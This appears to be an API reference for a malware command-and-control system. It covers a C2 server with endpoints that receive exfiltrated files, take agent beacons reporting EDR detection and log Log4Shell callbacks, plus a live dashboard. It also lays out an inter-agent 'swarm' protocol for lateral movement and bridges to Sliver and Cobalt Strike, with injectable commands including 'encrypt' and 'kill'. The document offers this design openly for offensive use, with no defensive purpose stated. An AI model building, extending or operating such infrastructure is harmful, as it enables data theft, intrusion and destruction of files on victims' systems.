# C2 & Dashboard API

## C2 Server (port 8443)

### POST /collect — Receive exfiltrated files

Headers:
- `X-File-Name`: original filename
- `X-Agent-ID`: agent UUID
- `X-Agent-Role`: scout|shaper|hoarder|weaver|overmind|worm
- `Content-Type`: application/octet-stream

Body: raw file bytes

Response:
```json
{"status": "received", "sha256": "abc123...", "size": 12345}
```

### POST /beacon — Agent heartbeat/status

Headers:
- `X-Agent-ID`: agent UUID
- `X-Agent-Role`: agent role

Body: JSON with agent status
```json
{"status": "alive", "edr_detected": false}
```

Response:
```json
{"status": "ack", "beacon_count": 42}
```

### POST /jndi — Log4Shell callback

Headers:
- `X-Victim-Host`: victim hostname

Response:
```json
{"status": "logged", "callback": "received"}
```

### GET /health — Health check

```json
{
  "status": "ok",
  "exfil_count": 5,
  "beacon_count": 42,
  "uptime": 3600
}
```

### GET / — Dashboard UI

HTML dashboard with exfiltration log and beacon history.

### GET /logs — Exfiltration & beacon log

```json
{
  "exfiltrations": [...],
  "beacons": [...]
}
```

---

## Dashboard (port 8080)

### GET / — HTML Dashboard

Cyberpunk-themed real-time status. Auto-refresh every 3 seconds.

Shows:
- ASCII art logo
- Status bar (LIVE / AWAITING / DORMANT)
- 4 metrics: active agents, shared mem files, memfd count, total memory
- Agent table with PID, role, memory, status
- Role-specific icons and colors
- Uptime counter

### GET /api/state — JSON State

```json
{
  "timestamp": "21:04:36",
  "uptime": 3600,
  "agents": [
    {"pid": 12345, "role": "scout", "mem": 24}
  ],
  "shm_files": ["swarm_abc123"],
  "memfds": 5
}
```

---

## Swarm LdC Internal Protocol

All inter-agent messages use the LdC (Language de la Colmena) protocol, serialized with MessagePack.

### Message Types

| Type | Fields | Purpose |
|------|--------|---------|
| Belief | asset, value, confidence | Scout publishes facts about the environment |
| Desire | action, priority | Agent expresses intent |
| Proposal | action, argument, proposal_id | Shaper proposes lateral movement |
| Vote | proposal_id, decision, weight | Agent votes on proposal |
| Request | service, payload | Agent requests service (scan, obfuscate, regenerate) |
| Query | dilemma, context, query_id | Overmind asked for strategic advice |
| Response | query_id, answer, confidence | Overmind replies |
| Heartbeat | — | Keep-alive signal |
| StatusEvent | event_type, subject_id, detail | Dead agent, kill switch, worm terminate |

### Message Format

All messages are signed with Ed25519:

```rust
struct Message {
    agent_id: Uuid,
    agent_role: Role,
    timestamp: u64,
    payload: Payload,
}
```

The arena stores the raw signed bytes plus the Ed25519 signature and verifying key.

---

## C2 Bridge Protocol

The Overmind can translate LdC messages to external C2 formats:

### Sliver gRPC

Beliefs become Sliver session notes with fields:
```json
{
  "type": "swarm_belief",
  "agent_id": "...",
  "asset": "edr_present",
  "value": "Bool(true)",
  "confidence": 0.95
}
```

### Cobalt Strike Beacon

Beliefs become beacon callbacks (type 0x21):
```
[0x21][agent_id:4][timestamp:8][asset_name\0][value_str\0][confidence_pct]
```

### HTTP Bridge

External C2 can inject commands via POST:

```json
{"task_id": "...", "command": "scan"}
{"task_id": "...", "command": "encrypt"}
{"task_id": "...", "command": "kill"}
{"task_id": "...", "command": "inject_belief", "arguments": ["target_host", "192.168.1.50"]}
```
